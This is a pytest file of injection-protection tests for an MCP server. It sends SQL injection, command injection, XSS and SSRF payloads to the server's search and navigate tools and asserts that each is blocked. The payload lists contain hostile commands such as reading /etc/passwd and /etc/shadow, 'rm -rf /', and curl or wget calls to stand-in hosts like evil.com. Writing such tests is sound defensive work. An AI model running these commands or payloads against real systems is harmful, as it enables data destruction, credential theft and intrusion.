#!/usr/bin/env python3
"""
Injection Protection Tests for MCP Server
TDD: Test SQL, Command, and XSS injection detection
"""
import pytest
import json
import subprocess
from typing import Dict


# MCP Server path - use relative path
import os
SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MCP_SERVER = os.path.join(SCRIPT_DIR, "mcp_server.py")


def run_mcp_command(cmd: Dict) -> Dict:
    """Execute MCP command via stdin/stdout"""
    proc = subprocess.Popen(
        ["python3", MCP_SERVER],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    stdout, stderr = proc.communicate(input=json.dumps(cmd) + "\n", timeout=30)
    try:
        return json.loads(stdout.strip())
    except:
        return {"error": stdout or stderr}


class TestSQLInjectionProtection:
    """SQL Injection protection test suite"""

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1' UNION SELECT * FROM passwords--",
        "admin'--",
        "1' OR 1=1--",
        "'; DELETE FROM users; --",
        "1' AND '1'='1",
        "1'; WAITFOR DELAY '0:0:5'--",
    ])
    def test_sql_injection_blocked(self, payload):
        """Test SQL injection attempts are blocked"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": payload}
            }
        })

        # Should either block or sanitize
        resp_str = str(resp).lower()
        assert ("blocked" in resp_str or
                "error" in resp_str or
                "validation failed" in resp_str or
                "injection" in resp_str), \
            f"SQL injection not blocked: {payload[:30]}"

    def test_sql_keywords_blocked(self):
        """Test SQL keywords in queries are blocked"""
        sql_keywords = [
            "SELECT * FROM users",
            "INSERT INTO data VALUES",
            "UPDATE users SET",
            "DELETE FROM users",
            "DROP TABLE",
            "UNION SELECT",
            "ALTER TABLE",
            "CREATE DATABASE",
        ]

        for keyword in sql_keywords:
            resp = run_mcp_command({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": "search",
                    "arguments": {"query": keyword}
                }
            })

            resp_str = str(resp).lower()
            assert ("blocked" in resp_str or
                    "error" in resp_str or
                    "validation" in resp_str), \
                f"SQL keyword not blocked: {keyword}"

    def test_hex_value_injection(self):
        """Test hex value injection attempts"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": "0x756e696f6e"}
            }
        })

        # Should handle safely
        assert "result" in resp or "error" in resp


class TestCommandInjectionProtection:
    """Command Injection protection test suite"""

    @pytest.mark.parametrize("payload", [
        "; cat /etc/passwd",
        "| ls -la",
        "`whoami`",
        "$(whoami)",
        "test && rm -rf /",
        "test; cat /etc/shadow",
        "test | wget malicious.com",
        "test && curl evil.com",
        "; ls",
        "| cat /etc/passwd",
    ])
    def test_command_injection_blocked(self, payload):
        """Test command injection attempts are blocked"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": payload}
            }
        })

        resp_str = str(resp).lower()
        assert ("blocked" in resp_str or
                "error" in resp_str or
                "validation failed" in resp_str), \
            f"Command injection not blocked: {payload[:30]}"

    def test_shell_metacharacters_blocked(self):
        """Test shell metacharacters are blocked"""
        metacharacters = [
            "test;ls",
            "test|ls",
            "test`ls`",
            "$(ls)",
            "test&&ls",
            "test||ls",
        ]

        for char in metacharacters:
            resp = run_mcp_command({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": "search",
                    "arguments": {"query": char}
                }
            })

            resp_str = str(resp).lower()
            assert ("blocked" in resp_str or
                    "error" in resp_str or
                    "validation" in resp_str), \
                f"Shell metacharacter not blocked: {char}"


class TestXSSProtection:
    """XSS protection test suite"""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "<iframe src=evil.com>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<marquee onstart=alert('xss')>",
    ])
    def test_xss_blocked(self, payload):
        """Test XSS attempts are blocked"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": payload}
            }
        })

        resp_str = str(resp).lower()
        assert ("blocked" in resp_str or
                "error" in resp_str or
                "validation failed" in resp_str or
                "injection" in resp_str or
                "xss" in resp_str), \
            f"XSS not blocked: {payload[:30]}"

    def test_html_tags_blocked(self):
        """Test dangerous HTML tags (XSS vectors) are blocked"""
        # Only dangerous XSS vectors should be blocked
        # <div>, <span>, <a>, <table> are not XSS by themselves
        dangerous_tags = [
            "<script>",  # Direct script injection
            "<iframe>",  # Frame injection
            "<object>",  # Object injection
            "<embed>",   # Embed injection
        ]

        for tag in dangerous_tags:
            resp = run_mcp_command({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": "search",
                    "arguments": {"query": tag}
                }
            })

            resp_str = str(resp).lower()
            assert ("blocked" in resp_str or
                    "error" in resp_str or
                    "validation" in resp_str or
                    "xss" in resp_str), \
                f"Dangerous HTML tag not blocked: {tag}"


class TestInputValidation:
    """General input validation tests"""

    def test_normal_query_allowed(self):
        """Test normal queries are allowed"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": "python programming"}
            }
        })

        # Should work (may error if backend unavailable)
        assert "result" in resp or "error" in resp

    def test_query_length_limit(self):
        """Test query length is limited"""
        # Create very long query
        long_query = "a" * 2000

        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": long_query}
            }
        })

        resp_str = str(resp).lower()
        assert ("too long" in resp_str or
                "error" in resp_str or
                "validation" in resp_str), \
            "Long query should be rejected"

    def test_null_bytes_removed(self):
        """Test null bytes are removed"""
        query = "test\x00injection"

        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {"query": query}
            }
        })

        # Should handle null bytes safely
        assert "result" in resp or "error" in resp


class TestSSRFProtection:
    """SSRF protection tests"""

    @pytest.mark.parametrize("url", [
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",
    ])
    def test_internal_urls_blocked(self, url):
        """Test internal URLs are blocked"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "navigate",
                "arguments": {"url": url}
            }
        })

        resp_str = str(resp).lower()
        assert ("blocked" in resp_str or
                "error" in resp_str), \
            f"Internal URL not blocked: {url}"

    def test_unsupported_protocol_blocked(self):
        """Test unsupported protocols are blocked"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "navigate",
                "arguments": {"url": "ftp://example.com"}
            }
        })

        resp_str = str(resp).lower()
        assert ("unsupported" in resp_str or
                "error" in resp_str or
                "scheme" in resp_str), \
            "Unsupported protocol should be blocked"

    def test_allowed_protocol_https(self):
        """Test HTTPS is allowed"""
        resp = run_mcp_command({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "navigate",
                "arguments": {"url": "https://example.com"}
            }
        })

        # Should work or return network error (not blocked)
        assert "result" in resp or ("error" in resp and "Blocked" not in str(resp))


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
